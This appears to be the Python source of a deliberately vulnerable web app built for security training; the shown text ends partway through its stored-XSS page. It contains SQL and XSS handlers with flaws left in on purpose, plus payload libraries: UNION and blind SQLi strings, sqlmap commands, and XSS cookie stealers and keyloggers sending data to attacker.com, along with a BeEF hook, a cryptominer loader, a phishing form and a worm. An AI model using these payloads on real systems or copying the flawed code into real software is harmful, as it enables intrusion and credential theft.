#!/usr/bin/env python3
"""Enhanced DVWA v2.0 — by Khalil
Security training tool for educational use only. Run isolated/localhost only."""

import http.server, urllib.parse, html, json, os, re, sqlite3
import base64, hashlib, hmac, time, threading
from socketserver import ThreadingMixIn

DB_PATH = "/tmp/dvwa_khalil.db"
SECURITY_LEVEL = {"level": "low"}
DIFFICULTY_COLORS = {"low": "#e74c3c", "medium": "#e67e22", "high": "#27ae60"}
RATE_LIMIT_STORE = {}

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT, role TEXT DEFAULT 'user', secret TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, author TEXT, content TEXT, timestamp TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS notes (id INTEGER PRIMARY KEY, user TEXT, note TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, category TEXT, secret TEXT)")
    users = [
        (1,"admin","5f4dcc3b5aa765d61d8327deb882cf99","admin@dvwa.local","admin","FLAG{sql_injection_master}"),
        (2,"gordonb","e99a18c428cb38d5f260853678922e03","gordonb@dvwa.local","user","FLAG{user_data_exposed}"),
        (3,"1337","8d3533d75ae2c3966d7e0d4fcc69216b","punk@dvwa.local","user","secret_key_1337"),
        (4,"pablo","0d107d09f5bbe40cade3de5c71e9e9b7","pablo@dvwa.local","user","pablo_secret"),
        (5,"smithy","5f4dcc3b5aa765d61d8327deb882cf99","smithy@dvwa.local","user","smithy_note"),
        (6,"alice","482c811da5d5b4bc6d497ffa98491e38","alice@dvwa.local","user","FLAG{blind_sqli_found}"),
    ]
    c.executemany("INSERT OR IGNORE INTO users VALUES (?,?,?,?,?,?)", users)
    c.executemany("INSERT OR IGNORE INTO comments VALUES (?,?,?,?)", [
        (1,"admin","Welcome to the guestbook!","2024-01-01 10:00:00"),
        (2,"gordonb","This site is awesome","2024-01-02 11:00:00"),
    ])
    c.executemany("INSERT OR IGNORE INTO notes VALUES (?,?,?)", [
        (1,"admin","Admin password reminder: password"),
        (2,"gordonb","My note: abc123"),
        (3,"alice","FLAG{idor_user3_note}"),
    ])
    c.executemany("INSERT OR IGNORE INTO products VALUES (?,?,?,?,?)", [
        (1,"Laptop",999.99,"electronics","FLAG{union_select_products}"),
        (2,"Phone",499.99,"electronics","secret_product"),
        (3,"Tablet",299.99,"electronics","hidden_data"),
    ])
    conn.commit(); conn.close()

def pcard(title, desc, payload, field_id=None):
    onclick = ""
    if field_id:
        sp = payload.replace("\\","\\\\").replace("'","\\'").replace("\n","\\n")
        onclick = f" onclick=\"document.getElementById('{field_id}').value='{sp}'\" style='cursor:pointer'"
    return (f'<div class="pbox"{onclick}>'
            f'<div class="ptitle">{html.escape(title)}</div>'
            f'<div class="pdesc">{html.escape(desc)}</div>'
            f'<code>{html.escape(payload)}</code></div>')

def base_page(title, content, active=""):
    lv = SECURITY_LEVEL["level"]
    col = DIFFICULTY_COLORS[lv]
    nav_items = [
        ("home","/","Home"),("sqli","/sqli","SQL Injection"),("sqli-blind","/sqli-blind","Blind SQLi"),
        ("xss-reflected","/xss-reflected","XSS Reflected"),("xss-stored","/xss-stored","XSS Stored"),
        ("xss-dom","/xss-dom","XSS DOM"),("csrf","/csrf","CSRF"),("file-upload","/file-upload","File Upload"),
        ("file-include","/file-include","File Inclusion"),("cmd-inject","/cmd-inject","CMD Injection"),
        ("auth-bypass","/auth-bypass","Auth Bypass"),("idor","/idor","IDOR"),
        ("xxe","/xxe","XXE"),("ssti","/ssti","SSTI"),("open-redirect","/open-redirect","Open Redirect"),
        ("insecure-deser","/insecure-deser","Insecure Deser"),("weak-crypto","/weak-crypto","Weak Crypto"),
        ("jwt","/jwt","JWT Attacks"),("rate-limit","/rate-limit","Rate Limiting"),
        ("bruteforce","/bruteforce","Brute Force"),("clickjacking","/clickjacking","Clickjacking"),
        ("ssrf","/ssrf","SSRF"),("hpp","/hpp","HTTP Param Poll"),("cors","/cors","CORS Misconfig"),
        ("security","/security","Security Level"),
    ]
    nav = "".join(f'<a href="{h}" class="{"active" if active==k else ""}">{l}</a>' for k,h,l in nav_items)
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} | Enhanced DVWA by Khalil</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}}
a{{color:#58a6ff;text-decoration:none}}a:hover{{text-decoration:underline}}
.sidebar{{position:fixed;left:0;top:0;bottom:0;width:220px;background:#161b22;border-right:1px solid #30363d;overflow-y:auto}}
.logo{{padding:1rem;border-bottom:1px solid #30363d;background:#0d1117}}
.logo h1{{font-size:1rem;color:#f0f6fc;letter-spacing:1px}}.logo .sub{{font-size:11px;color:#8b949e;margin-top:2px}}
.logo .badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;margin-top:6px;background:{col};color:#fff}}
nav a{{display:block;padding:.38rem 1rem;font-size:12.5px;color:#8b949e;border-left:3px solid transparent;transition:all .15s}}
nav a:hover,nav a.active{{background:#21262d;color:#f0f6fc;border-left-color:#58a6ff;text-decoration:none}}
.main{{margin-left:220px;padding:2rem;max-width:980px}}
.ph{{margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:1px solid #30363d}}
.ph h2{{font-size:1.5rem;color:#f0f6fc;margin-bottom:.25rem}}.ph p{{color:#8b949e;font-size:14px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.25rem;margin-bottom:1rem}}
.card h3{{color:#f0f6fc;margin-bottom:.75rem;font-size:1rem}}
label{{display:block;margin-bottom:4px;font-size:13px;color:#8b949e}}
input[type=text],input[type=password],input[type=number],input[type=url],textarea,select{{width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;margin-bottom:10px;font-family:inherit}}
input:focus,textarea:focus,select:focus{{outline:none;border-color:#58a6ff}}textarea{{resize:vertical;min-height:80px}}
.btn{{display:inline-block;padding:8px 16px;border:none;border-radius:6px;font-size:13px;cursor:pointer;font-family:inherit;font-weight:500;margin-right:5px;margin-top:4px}}
.btn-d{{background:#da3633;color:#fff}}.btn-d:hover{{background:#f85149}}
.btn-p{{background:#238636;color:#fff}}.btn-p:hover{{background:#2ea043}}
.btn-i{{background:#1f6feb;color:#fff}}.btn-i:hover{{background:#388bfd}}
.btn-s{{background:#21262d;color:#c9d1d9;border:1px solid #30363d}}
.btn-w{{background:#9e6a03;color:#fff}}
.out{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:1rem;margin-top:.75rem;font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;min-height:40px;color:#7ee787}}
.flag{{background:#1c2a1c;border:1px solid #238636;border-radius:6px;padding:.75rem;color:#7ee787;font-family:monospace;font-size:13px;margin-top:.5rem;white-space:pre-wrap}}
.err{{background:#2a1a1a;border:1px solid #da3633;border-radius:6px;padding:.75rem;color:#f85149;font-size:13px;margin-top:.5rem}}
.hint{{background:#1a1e2a;border:1px solid #1f6feb;border-radius:6px;padding:.75rem;color:#79c0ff;font-size:13px;margin-top:.5rem}}
.warn{{background:#1f1a0e;border:1px solid #9e6a03;border-radius:6px;padding:.75rem;color:#e3b341;font-size:13px;margin-top:.5rem}}
.ibox{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:1rem;margin-bottom:.75rem}}
.ibox h4{{color:#f0f6fc;margin-bottom:.5rem;font-size:.9rem;border-bottom:1px solid #30363d;padding-bottom:4px}}
.ibox p{{color:#8b949e;font-size:13px;line-height:1.6;margin-bottom:.4rem}}
.ibox ul{{color:#8b949e;font-size:13px;line-height:1.8;padding-left:1.25rem}}
.ibox code{{background:#0d1117;padding:1px 5px;border-radius:3px;font-size:12px;color:#79c0ff}}
.g2{{display:grid;grid-template-columns:1fr 1fr;gap:1rem}}
.g3{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem}}
.vtag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#2a1a1a;color:#f85149;border:1px solid #da3633;margin-right:4px;margin-bottom:4px}}
.stag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#1c2a1c;color:#7ee787;border:1px solid #238636}}
.itag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#1a1e2a;color:#79c0ff;border:1px solid #1f6feb}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th{{text-align:left;padding:8px;color:#8b949e;border-bottom:1px solid #30363d;font-weight:500}}
td{{padding:8px;border-bottom:1px solid #21262d;color:#c9d1d9}}tr:last-child td{{border-bottom:none}}
.lbadge{{padding:3px 10px;border-radius:12px;font-size:12px;font-weight:700;background:{col};color:#fff}}
.stitle{{color:#f0f6fc;font-size:13px;font-weight:600;margin:1rem 0 .4rem;padding-bottom:3px;border-bottom:1px solid #30363d}}
.pbox{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.65rem;margin-bottom:.4rem}}
.pbox:hover{{border-color:#58a6ff}}.ptitle{{color:#e3b341;font-size:12px;font-weight:600;margin-bottom:3px}}
.pdesc{{color:#8b949e;font-size:12px;margin-bottom:5px;line-height:1.4}}
.pbox code{{display:block;color:#7ee787;font-family:monospace;font-size:11px;word-break:break-all;background:#161b22;padding:5px 7px;border-radius:4px}}
.step{{display:flex;gap:10px;margin-bottom:.6rem;align-items:flex-start}}
.snum{{background:#1f6feb;color:#fff;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:2px}}
.stxt{{color:#8b949e;font-size:13px;line-height:1.5}}
</style></head><body>
<div class="sidebar"><div class="logo"><h1>Enhanced DVWA</h1><div class="sub">by Khalil</div><span class="badge">{lv.upper()}</span></div><nav>{nav}</nav></div>
<div class="main">{content}</div></body></html>"""

# ── HOME ──────────────────────────────────────────────────────────────────────
def page_home():
    vulns=[
        ("SQL Injection","/sqli","Dump database via malicious SQL","critical"),
        ("Blind SQLi","/sqli-blind","Boolean/time-based extraction","high"),
        ("XSS Reflected","/xss-reflected","Script injection via URL params","high"),
        ("XSS Stored","/xss-stored","Persistent script in database","critical"),
        ("XSS DOM","/xss-dom","Client-side script via DOM sinks","high"),
        ("CSRF","/csrf","Forge authenticated user requests","high"),
        ("File Upload","/file-upload","Upload web shells bypassing filters","critical"),
        ("File Inclusion","/file-include","LFI — read arbitrary server files","critical"),
        ("CMD Injection","/cmd-inject","Execute OS commands via app input","critical"),
        ("Auth Bypass","/auth-bypass","Bypass login via SQLi/logic flaws","critical"),
        ("IDOR","/idor","Access other users data by ID manipulation","high"),
        ("XXE","/xxe","XML entity injection to read files","high"),
        ("SSTI","/ssti","Server template injection for RCE","critical"),
        ("Open Redirect","/open-redirect","Redirect users to attacker URLs","medium"),
        ("Insecure Deser","/insecure-deser","Exploit unsafe deserialization","critical"),
        ("Weak Crypto","/weak-crypto","Exploit weak hashing and encoding","medium"),
        ("JWT Attacks","/jwt","Forge/tamper JSON Web Tokens","high"),
        ("Rate Limiting","/rate-limit","Brute force unprotected endpoints","medium"),
        ("Brute Force","/bruteforce","Automated credential cracking lab","high"),
        ("Clickjacking","/clickjacking","Hidden iframe click hijacking","medium"),
        ("SSRF","/ssrf","Server-Side Request Forgery — pivot via server","high"),
        ("HTTP Param Poll","/hpp","Duplicate params bypass logic/WAF","medium"),
        ("CORS Misconfig","/cors","Cross-origin data theft","high"),
    ]
    sc={"critical":"#f85149","high":"#e3b341","medium":"#79c0ff","low":"#7ee787"}
    rows="".join(f'<tr><td><a href="{h}">{n}</a></td><td style="color:#8b949e;font-size:12px">{d}</td><td><span style="color:{sc.get(s,"#8b949e")};font-size:12px;font-weight:700">{s.upper()}</span></td></tr>' for n,h,d,s in vulns)
    return base_page("Home",f"""
<div class="ph"><h2>Enhanced DVWA v2.0 — by Khalil</h2><p>Deliberately vulnerable web app for security education. 23 modules with full payload libraries and attack guides.</p></div>
<div class="card"><div style="display:flex;align-items:center;gap:1rem">
  <div><div style="font-size:13px;color:#8b949e">Security Level</div><span class="lbadge">{SECURITY_LEVEL['level'].upper()}</span></div>
  <div style="margin-left:auto"><a href="/security" class="btn btn-s">Change Level</a></div></div></div>
<div class="card"><h3>Vulnerability Index — {len(vulns)} Modules</h3>
<table><thead><tr><th>Vulnerability</th><th>Description</th><th>Severity</th></tr></thead><tbody>{rows}</tbody></table></div>
<div class="warn"><strong>WARNING:</strong> Educational use only. Run on localhost or isolated VM. Never expose to any network.</div>""","home")

# ── SQL INJECTION ─────────────────────────────────────────────────────────────
def page_sqli(params):
    lv=SECURITY_LEVEL["level"]; uid=params.get("id",[""])[0]; result=""
    if uid:
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT id,username,email,role,secret FROM users WHERE id = {uid}"
                c.execute(q); rows=c.fetchall()
                result=('<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]} Email:{r[2]} Role:{r[3]} Secret:{r[4]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>')
                result+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            elif lv=="medium":
                try:
                    c.execute(f"SELECT id,username,email FROM users WHERE id = {int(uid)}")
                    rows=c.fetchall()
                    result='<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]} Email:{r[2]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>'
                except ValueError: result='<div class="err">Invalid ID format.</div>'
            else:
                c.execute("SELECT id,username FROM users WHERE id = ?",(uid,)); rows=c.fetchall()
                result='<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>'
        except Exception as e: result=f'<div class="err">DB Error: {html.escape(str(e))}</div>'
        conn.close()
    pl=[
        ("Dump all users","OR 1=1 makes condition always true — returns all rows","1 OR 1=1-- -"),
        ("Admin bypass","Comment out rest of WHERE clause","admin'-- -"),
        ("UNION col count","Find column count — add NULLs until no error","1 ORDER BY 5-- -"),
        ("UNION dump users","Extract all usernames/secrets","0 UNION SELECT id,username,secret,email,role FROM users-- -"),
        ("UNION dump products","Pivot to products table","0 UNION SELECT id,name,secret,category,price FROM products-- -"),
        ("SQLite version","Fingerprint database engine","0 UNION SELECT 1,sqlite_version(),3,4,5-- -"),
        ("List tables","Read sqlite_master to find table names","0 UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'-- -"),
        ("Table schema","Get column names of users table","0 UNION SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='users'-- -"),
        ("Stacked comments","Bypass simple keyword filters","1/**/OR/**/1=1-- -"),
        ("URL encoded","Evade simple WAF rules","%31%20%4f%52%20%31%3d%31"),
        ("Case variation","Bypass case-sensitive keyword filters","1 oR 1=1-- -"),
        ("Nested comment","MySQL: bypass filter that strips --","1 OR 1=1#"),
    ]
    ph='<div class="stitle">Payloads (click to fill input)</div>'+"".join(pcard(t,d,p,"sqli-input") for t,d,p in pl)
    return base_page("SQL Injection",f"""
<div class="ph"><h2>SQL Injection</h2><p>Manipulate SQL queries to bypass auth, extract data, and enumerate the entire database.</p></div>
<div class="g2">
<div>
<div class="card"><h3>User Lookup <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>User ID</label><input type="text" name="id" id="sqli-input" value="{html.escape(uid)}" placeholder="1 OR 1=1-- -"><button class="btn btn-d" type="submit">Submit</button></form>{result}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:460px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How SQL Injection Works</h4>
<p>When user input is embedded directly in a SQL query without sanitization, injected SQL syntax alters the query logic. The attacker breaks out of the string context using quotes, then adds arbitrary SQL.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Detect: inject <code>'</code> — look for database errors</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Count columns: <code>ORDER BY 1,2,3...</code> until error</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">UNION SELECT to extract data from any table</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Dump users, hashes, secrets, then crack offline</div></div>
<div class="step"><div class="snum">5</div><div class="stxt">Escalate: read/write files, execute OS commands (if permissions allow)</div></div>
</div>
<div class="ibox"><h4>Tools</h4><ul>
<li><strong style="color:#f0f6fc">sqlmap</strong> — <code>sqlmap -u "http://localhost:8888/sqli?id=1" --dump --dbs</code></li>
<li><strong style="color:#f0f6fc">Manual</strong> — Burp Suite Repeater for step-by-step exploitation</li>
<li><strong style="color:#f0f6fc">Havij</strong> — GUI-based automated SQLi tool</li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>Parameterized queries: <code>cursor.execute("SELECT * FROM users WHERE id=?", (id,))</code></li>
<li>Use an ORM — SQLAlchemy, Django ORM, Hibernate</li>
<li>Validate and whitelist input types (reject non-integers for ID fields)</li>
<li>Least-privilege DB user — no DROP/CREATE/FILE rights for app account</li>
<li>Disable verbose error messages in production</li>
</ul></div>
</div></div>""","sqli")

# ── BLIND SQLI ────────────────────────────────────────────────────────────────
def page_sqli_blind(params):
    lv=SECURITY_LEVEL["level"]; uid=params.get("id",[""])[0]; result=""
    if uid:
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT id FROM users WHERE id = {uid}"
                c.execute(q); row=c.fetchone()
                result=('<div class="flag">Response: TRUE — User exists</div>' if row else '<div class="err">Response: FALSE — User does not exist</div>')
                result+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            else:
                try:
                    c.execute("SELECT id FROM users WHERE id = ?",(int(uid),)); row=c.fetchone()
                    result='<div class="flag">Response: TRUE</div>' if row else '<div class="err">Response: FALSE</div>'
                except: result='<div class="err">Response: FALSE</div>'
        except: result='<div class="err">Response: FALSE</div>'
        conn.close()
    pl=[
        ("Boolean TRUE","Confirm injection — query returns TRUE","1 AND 1=1-- -"),
        ("Boolean FALSE","Confirm injection — query returns FALSE","1 AND 1=2-- -"),
        ("Extract admin hash char 1","Check if first char of admin's MD5 hash is '5'","1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='5'-- -"),
        ("Username length","Check if admin username length > 4","1 AND LENGTH((SELECT username FROM users WHERE id=1))>4-- -"),
        ("Count users","Check if more than 3 users exist","1 AND (SELECT COUNT(*) FROM users)>3-- -"),
        ("Role check","Confirm user ID 1 is admin","1 AND (SELECT role FROM users WHERE id=1)='admin'-- -"),
        ("DB version char","Extract first char of SQLite version","1 AND SUBSTR(sqlite_version(),1,1)='3'-- -"),
        ("Table exists","Check if products table exists","1 AND (SELECT COUNT(*) FROM sqlite_master WHERE name='products')>0-- -"),
        ("Time-based","SQLite: heavy computation causes detectable delay","1 AND 1=(SELECT 1 FROM (SELECT RANDOMBLOB(50000000)) WHERE 1=1)-- -"),
        ("Second user secret","Extract first char of user 2 secret","1 AND SUBSTR((SELECT secret FROM users WHERE id=2),1,1)='F'-- -"),
    ]
    ph='<div class="stitle">Boolean Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"blind-input") for t,d,p in pl)
    return base_page("Blind SQLi",f"""
<div class="ph"><h2>Blind SQL Injection</h2><p>No data returned — only TRUE/FALSE response. Extract data one character at a time using boolean conditions.</p></div>
<div class="g2">
<div>
<div class="card"><h3>User Check <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>User ID</label><input type="text" name="id" id="blind-input" value="{html.escape(uid)}" placeholder="1 AND 1=1-- -"><button class="btn btn-d" type="submit">Check</button></form>{result}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:440px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Blind SQLi Works</h4>
<p>When the app returns different responses based on query truth (page changes, error, redirect) but shows no actual data, you can infer each character of sensitive fields using SUBSTR() comparisons.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Confirm: <code>1 AND 1=1</code> = TRUE, <code>1 AND 1=2</code> = FALSE</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Use SUBSTR() to check one char at a time: <code>SUBSTR(password,1,1)='5'</code></div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Binary search ASCII 32-126 to find each character efficiently</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Automate with sqlmap <code>--technique=B</code> or custom Python script</div></div>
</div>
<div class="ibox"><h4>Automation</h4><ul>
<li><code>sqlmap -u "http://localhost:8888/sqli-blind?id=1" --technique=B --dump</code></li>
<li>Custom Python with <code>requests</code> — loop chars, check response length difference</li>
<li>Burp Intruder with Sniper + grep-match on TRUE indicator</li>
</ul></div>
<div class="ibox"><h4>Time-Based Blind</h4>
<p>When TRUE/FALSE responses look identical, inject time delays.<br>
MySQL: <code>1 AND SLEEP(5)-- -</code><br>
PostgreSQL: <code>1;SELECT pg_sleep(5)-- -</code><br>
SQLite: use RANDOMBLOB heavy computation</p></div>
</div></div>""","sqli-blind")

def page_xss_reflected(params):
    lv=SECURITY_LEVEL["level"]; name=params.get("name",[""])[0]; out=""
    if name:
        if lv=="low":   out=f'<div class="out" style="color:#c9d1d9">Hello, {name}!</div>'
        elif lv=="medium":
            s=re.sub(r'<script[^>]*>.*?</script>','',name,flags=re.IGNORECASE|re.DOTALL)
            out=f'<div class="out" style="color:#c9d1d9">Hello, {s}!</div>'
        else: out=f'<div class="out">Hello, {html.escape(name)}!</div>'
    pl=[
        ("Classic script alert","Tests if <script> tags pass through","<script>alert('XSS by Khalil')</script>"),
        ("img onerror","Fires on broken image — bypasses script filters","<img src=x onerror=alert(document.domain)>"),
        ("SVG onload","SVG element executes JS on load","<svg onload=alert(1)>"),
        ("body onload","Inject full body tag with event handler","<body onload=alert(1)>"),
        ("iframe javascript","Execute JS in iframe src attribute","<iframe src=javascript:alert(1)>"),
        ("Cookie stealer","Exfiltrate session cookie to attacker","<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"),
        ("Keylogger","Log every keystroke victim types","<script>document.onkeypress=function(e){fetch('http://attacker.com/k?k='+e.key)}</script>"),
        ("DOM redirect","Silently redirect victim to phishing page","<script>window.location='http://attacker.com/phish'</script>"),
        ("Uppercase bypass","Bypasses lowercase-only script filter","<SCRIPT>alert(1)</SCRIPT>"),
        ("Mixed case event","HTML events are case-insensitive","<img src=1 oNeRrOr=alert(1)>"),
        ("JavaScript URI","Use javascript: in anchor href","<a href=javascript:alert(document.cookie)>Click me</a>"),
        ("Input autofocus","Fires onfocus on autofocused input — no click needed","<input autofocus onfocus=alert(1)>"),
        ("Details/summary","HTML5 ontoggle event","<details open ontoggle=alert(1)>"),
        ("Template literal","ES6 template literal eval","<script>alert(`XSS ${document.domain}`)</script>"),
        ("Base tag injection","Hijack relative URLs by injecting base tag","<base href=//attacker.com/>"),
        ("BeEF hook","Hook victim browser into BeEF framework","<script src='http://192.168.1.1:3000/hook.js'></script>"),
    ]
    ph='<div class="stitle">Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xss-r-input") for t,d,p in pl)
    return base_page("XSS Reflected",f"""
<div class="ph"><h2>XSS — Reflected</h2><p>Input reflected in server response without sanitization. Victim is tricked into clicking a crafted URL containing the payload.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Name Greeter <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="GET"><label>Your Name</label><input type="text" name="name" id="xss-r-input" value="{html.escape(name)}" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"><button class="btn btn-d" type="submit">Greet</button></form>{out}</div>
<div class="card"><h3>Payloads</h3><div style="max-height:500px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Reflected XSS Works</h4>
<p>The payload is in the HTTP request (URL param, form field) and immediately reflected in the response. Browser executes it as legitimate JavaScript in the page's origin context.</p>
<div class="step"><div class="snum">1</div><div class="stxt">Find input reflected in page source — check for your input verbatim</div></div>
<div class="step"><div class="snum">2</div><div class="stxt">Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to confirm execution</div></div>
<div class="step"><div class="snum">3</div><div class="stxt">Craft cookie-stealing or session-hijacking payload</div></div>
<div class="step"><div class="snum">4</div><div class="stxt">Deliver crafted URL to victim via phishing email</div></div>
</div>
<div class="ibox"><h4>Real-World Impact</h4><ul>
<li>Session hijacking — steal <code>document.cookie</code>, impersonate victim</li>
<li>Credential phishing — inject fake login form into trusted domain</li>
<li>Keylogging — capture every keystroke silently</li>
<li>Cryptomining — run miner in victim's browser</li>
<li>BeEF framework — full browser exploitation suite</li>
<li>CSRF execution — run CSRF attacks from victim's authenticated session</li>
</ul></div>
<div class="ibox"><h4>Filter Bypasses</h4><ul>
<li><code>&lt;SCRIPT&gt;</code> — uppercase bypasses lowercase filters</li>
<li><code>onerror</code>, <code>onload</code> — bypass script-tag-only filters</li>
<li><code>javascript:</code> URI — no angle brackets needed</li>
<li>HTML entities: <code>&amp;lt;script&amp;gt;</code> in some contexts</li>
<li>Double encoding: <code>%253Cscript%253E</code></li>
</ul></div>
<div class="ibox"><h4>Defense</h4><ul>
<li>HTML-encode all output: <code>html.escape(user_input)</code></li>
<li>Content Security Policy: <code>Content-Security-Policy: default-src 'self'</code></li>
<li>HTTPOnly + Secure cookie flags</li>
<li>X-XSS-Protection header (legacy support)</li>
</ul></div>
</div></div>""","xss-reflected")


def page_xss_stored(params,method="GET",body_params=None):
    lv=SECURITY_LEVEL["level"]; msg=""
    if method=="POST" and body_params:
        author=body_params.get("author",["Anonymous"])[0]; comment=body_params.get("comment",[""])[0]
        if comment:
            conn=sqlite3.connect(DB_PATH); c=conn.cursor()
            if lv=="low": sa,sc2=author,comment
            elif lv=="medium":
                sa=html.escape(author)
                sc2=re.sub(r'<script[^>]*>.*?</script>','',comment,flags=re.IGNORECASE|re.DOTALL)
            else: sa,sc2=html.escape(author),html.escape(comment)
            c.execute("INSERT INTO comments (author,content,timestamp) VALUES (?,?,?)",(sa,sc2,time.strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit(); conn.close(); msg='<div class="flag">Comment posted!</div>'
    conn=sqlite3.connect(DB_PATH); c=conn.cursor()
    c.execute("SELECT author,content,timestamp FROM comments ORDER BY id DESC"); rows=c.fetchall(); conn.close()
    ch="".join(f'<div style="background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.7rem;margin-bottom:.4rem"><strong style="color:#58a6ff">{(r[0] if lv=="low" else html.escape(r[0]))}</strong> <span style="color:#8b949e;font-size:12px">{r[2]}</span><p style="margin-top:.4rem;font-size:13px">{(r[1] if lv=="low" else html.escape(r[1]))}</p></div>' for r in rows)
    pl=[
        ("Classic persistent alert","Fires for every visitor who views the page","<script>alert('Stored XSS by Khalil')</script>"),
        ("Cookie harvester","Sends every visitor's session cookie to attacker","<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>"),
        ("Fetch cookie exfil","Modern fetch-based cookie exfiltration","<script>fetch('http://attacker.com/c?'+document.cookie)</script>"),
        ("Fake login form","Inject full phishing form into page","<div style='position:fixed;top:0;left:0;width:100%;background:#fff;z-index:9999;padding:20px'><h2>Session expired - login again</h2><form><input name=u placeholder=Username><input type=password name=p placeholder=Password><input type=submit value=Login></form></div>"),
        ("Page defacement","Replace entire page content with attacker message","<script>document.body.innerHTML='<h1 style=color:red;font-size:60px>Hacked by Khalil</h1>'</script>"),
        ("BeEF hook","Hook all visitors into BeEF browser exploitation framework","<script src='http://192.168.1.1:3000/hook.js'></script>"),
        ("Keylogger","Silently capture every keystroke visitors type","<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/k?k='+e.key)})</script>"),
        ("Cryptominer","Run JS miner in every visitor's browser (CPU abuse)","<script src='http://attacker.com/miner.min.js'></script>"),
        ("img onerror bypass","Bypasses <script> tag filters","<img src=x onerror=fetch('http://attacker.com/c?x='+document.cookie)>"),
        ("SVG bypass","SVG onload — different tag to evade script filters","<svg onload=fetch('http://attacker.com/?'+document.cookie)>"),
        ("Admin panel steal","Capture admin panel HTML and send to attacker","<script>fetch('/security').then(r=>r.text()).then(d=>fetch('http://attacker.com/dump?'+btoa(d)))</script>"),
        ("Worm payload","Self-replicating XSS — posts itself to all new comments","<script>fetch('/xss-stored',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'author=XSS_Worm&comment='+encodeURIComponent('<script>...<'+'/script>')})</script>"),
    ]
    ph='<div class="stitle">Stored Payloads (click to fill)</div>'+"".join(pcard(t,d,p,"xss-s-comment") for t,d,p in pl)
    return base_page("XSS Stored",f"""
<div class="ph"><h2>XSS — Stored</h2><p>Payload saved to database — fires automatically for every user who loads the page. No victim interaction needed after injection.</p></div>
<div class="g2">
<div>
<div class="card"><h3>Guestbook <span class="lbadge" style="font-size:11px">{lv}</span></h3>
<form method="POST"><label>Name</label><input type="text" name="author" value="Attacker"><label>Comment</label><textarea name="comment" id="xss-s-comment" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;"></textarea><button class="btn btn-d" type="submit">Post</button></form>{msg}</div>
<div class="card"><h3>Comments</h3><div style="max-height:260px;overflow-y:auto">{ch or '<p style="color:#8b949e;font-size:13px">No comments yet.</p>'}</div></div>
<div class="card"><h3>Payloads</h3><div style="max-height:400px;overflow-y:auto">{ph}</div></div>
</div>
<div>
<div class="ibox"><h4>How Stored XSS Works</h4>
